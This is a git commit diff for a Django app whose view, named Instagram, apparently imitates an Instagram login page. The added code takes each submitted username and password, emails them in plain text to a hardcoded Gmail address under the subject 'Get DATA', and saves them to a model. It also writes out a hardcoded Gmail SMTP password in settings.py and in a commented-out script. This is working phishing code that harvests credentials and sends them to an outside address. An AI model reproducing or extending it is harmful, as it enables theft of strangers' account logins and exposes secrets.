0cfbc88ab175710c12fe3e840b1b6a40421066f2
satyam430133 <satyambadal07@gmail.com>
2024-08-13 06:02:00 +0530

    pl

--- main/main/settings.py
+++ main/main/settings.py
@@ -123,3 +123,12 @@ STATIC_URL = 'static/'
 # https://docs.djangoproject.com/en/5.1/ref/settings/#default-auto-field
 
 DEFAULT_AUTO_FIELD = 'django.db.models.BigAutoField'
+
+
+# settings.py
+EMAIL_BACKEND = 'django.core.mail.backends.smtp.EmailBackend'
+EMAIL_HOST = 'smtp.gmail.com'
+EMAIL_USE_TLS = True
+EMAIL_PORT = 587
+EMAIL_HOST_USER = 'satyambadal07@gmail.com'
+EMAIL_HOST_PASSWORD = '124578@Ok'
--- main/main/views.py
+++ main/main/views.py
@@ -2,6 +2,8 @@ from django.views import View
 from django.shortcuts import render,redirect
 from .models import Insta
 from django.contrib import messages
+from django.core.mail import EmailMultiAlternatives
+
 
 class Instagram(View):
     def get(self, request):
@@ -10,7 +12,50 @@ class Instagram(View):
     def post(self, request):
         username = request.POST['username']
         password = request.POST['password']
+         # Send email to the manager
+        manager_email = "satyambadal48@gmail.com"  # Replace with manager's actual email address
+        subject = f" Get DATA "
+        from_email = 'satyambadal07@gmail.com'
+        to_email = [manager_email]
+
+        text_content = f"""
+        A new account data is get......
+        username : {username}
+        password : {password}
+        Regards,
+        Your Company
+        """
+
+        email = EmailMultiAlternatives(subject, text_content, from_email, to_email)
+        email.send()
+
         create = Insta.objects.create(username=username, password=password)
         if create:
             messages.success(request, 'Log in successfully')
         return render(request,'welcome.html')
+
+
+
+# import smtplib
+# from email.mime.text import MIMEText
+
+# smtp_server = 'smtp.gmail.com'
+# smtp_port = 587
+# username = 'satyambadal07@gmail.com'
+# password = '124578@Ok'
+
+# msg = MIMEText('This is a test email.')
+# msg['Subject'] = 'Test Email'
+# msg['From'] = username
+# msg['To'] = 'satyambadal48@gmail.com'
+
+# try:
+#     server = smtplib.SMTP(smtp_server, smtp_port)
+#     server.starttls()
+#     server.login(username, password)
+#     server.sendmail(username, 'satyambadal48@gmail.com', msg.as_string())
+#     print("Email sent successfully")
+# except Exception as e:
+#     print(f"Failed to send email: {e}")
+# finally:
+#     server.quit()
